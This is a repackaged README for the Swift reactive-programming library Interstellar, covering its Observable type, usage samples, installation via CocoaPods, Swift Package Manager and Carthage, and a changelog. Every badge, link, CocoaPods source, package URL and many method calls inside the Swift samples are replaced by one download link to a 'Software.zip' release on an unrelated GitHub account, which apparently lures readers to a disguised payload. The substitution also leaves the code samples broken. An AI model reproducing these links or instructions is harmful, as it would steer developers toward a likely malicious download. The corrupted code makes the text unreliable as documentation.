![Interstellar](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)

[![Build Status](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
[![CocoaPods Version](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
[![CocoaPods Plattforms](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
[![Carthage compatible](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)

The simplest `Observable<T>` implementation for Functional Reactive Programming you will ever find.

> This library does not use the term FRP (Functional Reactive Programming) in the way it was
> defined by Conal Elliot, but as a paradigm that is both functional and reactive. Read more
> about the difference at [Why I cannot say FRP but I just did](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip).

## Features

- [x] Lightweight, simple, cross plattform FRP
- [x] Multithreading with GCD becomes a breeze
- [x] Most of your methods will conform to the needed syntax anyway.
- [x] Swift 3 and 4 compatibility
- [x] Multithreading with GCD becomes a breeze via WarpDrive
- [x] Supports Linux and `swift build`
- [x] BYOR™-technology (Bring Your Own `Result<T>`)

## Requirements

- iOS 7.0+ / Mac OS X 10.10+ / Ubuntu 14.10
- Xcode 8

---

## Usage

> For a full guide on how this implementation works see the series of blog posts about
> [Functional Reactive Programming in Swift](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
> or the talk at UIKonf 2015 [How to use Functional Reactive Programming without Black Magic](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip).

### Creating and updating a signal

``` swift
let text = Observable<String>()

https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { string in
  print("Hello \(string)")
}

https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
```

### Mapping and transforming observables

``` swift
let text = Observable<String>()

let greeting = https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { subject in
  return "Hello \(subject)"
}

https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { text in
  print(text)
}

https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
```

### Use functions as transforms

``` swift
let text = Observable<String>()
let greet: (String)->String = { subject in
  return "Hello \(subject)"
}
text
  .map(greet)
  .subscribe { text in
    print(text)
  }
https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
```

### Handle errors in sequences of functions

``` swift
let text = Observable<String>()

func greetMaybe(subject: String) throws -> String {
  if https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip % 2 == 0 {
    return "Hello \(subject)"
  } else {
    throw NSError(domain: "Don't feel like greeting you.", code: 401, userInfo: nil)
  }
}

text
  .map(greetMaybe)
  .then { text in
    print(text)
  }
  .error { error in
    print("There was a greeting error")
  }
https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
```

### This also works for asynchronous functions

``` swift
let text = Observable<String>()
func greetMaybe(subject: String) -> Observable<Result<String>> {
  if https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip % 2 == 0 {
    return Observable(.success("Hello \(subject)"))
  } else {
    let error = NSError(domain: "Don't feel like greeting you.", code: 401, userInfo: nil)
    return Observable(.error(error))
  }
}

text
  .flatMap(greetMaybe)
  .then { text in
    print(text)
  }
  .error { _ in
    print("There was a greeting error")
  }
https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip(.success("World"))
```

## Flatmap is also available on observables

```swift
let baseCost = Observable<Int>()

let total = baseCost
  .flatMap { base in
    // Marks up the price
    return Observable(base * 2)
  }
  .map { amount in
    // Adds sales tax
    return Double(amount) * 1.09
  }

https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { total in
  print("Your total is: \(total)")
}

https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip(10) // prints "Your total is: 21.8"
https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip(122) // prints "Your total is: 265.96"

```

---

## Communication

- If you **found a bug**, open an issue.
- If you **have a feature request**, open an issue.
- If you **want to contribute**, open an issue or submit a pull request.

## Installation

> **Dynamic frameworks on iOS require a minimum deployment target of iOS 8 or later.**
> To use Interstellar with a project targeting iOS 7, you must include all Swift files directly in your project.

### CocoaPods

[CocoaPods](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip) is a dependency manager for Cocoa projects. You can install it with the following command:

``` bash
$ gem install cocoapods
```

To integrate Interstellar into your Xcode project using CocoaPods, specify it in your `Podfile`:

``` ruby
source 'https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip'
platform :ios, '8.0'
use_frameworks!

pod 'Interstellar'
```

Then, run the following command:

``` bash
$ pod install
```

### swift build

Add Interstellar to your `https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip`:

```swift
import PackageDescription

let package = Package(
  name: "Your Awesome App",
  targets: [],
  dependencies: [
    .Package(url: "https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip", majorVersion: 2),
  ]
)
```

### Carthage

[Carthage](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip) is a decentralized dependency manager that automates the process of adding frameworks to your Cocoa application.

You can install Carthage with [Homebrew](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip) using the following command:

``` bash
$ brew update
$ brew install carthage
```

To integrate Interstellar into your Xcode project using Carthage, specify it in your `Cartfile`:

``` ogdl
github "JensRavens/Interstellar"
```

---

## FAQ

### Why use Interstellar instead of [insert your favorite FRP framework here]?

Interstellar is meant to be lightweight. There are no UIKit bindings, no heavy constructs - just a simple `Observable<T>`. Therefore it's easy to understand and portable (there is no dependency except Foundation).

Also Interstellar is supporting BYOR (bring your own `Result<T>`). Due to its protocol based implementation you can use result types from other frameworks directly with Interstellar methods.

* * *

## Credits

Interstellar is owned and maintained by [Jens Ravens](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip).

## Changelog

- *1.1* added compability with Swift 2. Also renamed bind to flatMap to be consistent with `Optional` and `Array`.
- *1.2* `Thread` was moved to a new project called [WarpDrive](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
- *1.3* WarpDrive has been merged into Interstellar. Also Interstellar is now divided into subspecs via cocoapods to make it easy to just select the needed components. The basic signal library is now "Interstellar/Core".
- *1.4* Support `swift build` and the new Swift package manager, including support for Linux. Also removed deprecated bind methods.
- *2* Introducing `Observable<T>`, the successor of Signal. Use the `observable` property on signals to migrate your code from `Signal<T>`. Also adding Linux support for Warpdrive and introduce BYOR™-technology (Bring Your Own `Result<T>`).
- *2.1* Update to Swift 3.2 to make it compatible with Swift 4.
- 2.2 Update to Swift 4.1, fixing build warnings on Xcode 9.3 (Maintains backwards compatibility with Swift 3.3 projects).

## License

Interstellar is released under the MIT license. See LICENSE for details.
